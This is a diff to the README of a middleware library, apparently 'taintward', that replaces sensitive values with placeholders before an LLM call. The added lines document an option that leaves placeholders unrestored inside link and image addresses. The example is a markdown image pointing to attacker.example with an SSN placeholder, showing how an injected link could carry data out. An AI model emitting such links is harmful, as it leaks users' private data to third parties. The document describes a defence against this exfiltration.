@@ -80,9 +80,15 @@ taintwardMiddleware({
   instruction: true,    // add one system line asking the model to copy placeholders exactly
   strict: false,        // true: throw PlaceholderRestoreError if a placeholder cannot be restored
   map: undefined,       // pass a PlaceholderMap to keep numbering across calls
-  onReport: (r) => {},  // see which placeholders the model rewrote, broke or invented
+  restoreInUrls: false, // true: also restore placeholders inside link and image addresses
+  onReport: (r) => {},  // see which placeholders the model rewrote, broke, invented or left in links
 });
 ```
+
+Placeholders inside a link or image address in the answer
+(`![x](https://attacker.example/?d=<SSN_1>)`) are not restored, so an
+injected link cannot carry the real value out. They show up in the report
+as `blocked`. `TAINTWARD_RESTORE_IN_URLS=1` also turns this off.
 
 The instruction line and the tolerant restore are on by default. Together
 they raised fully restored answers with small models from 2 in 5 to about
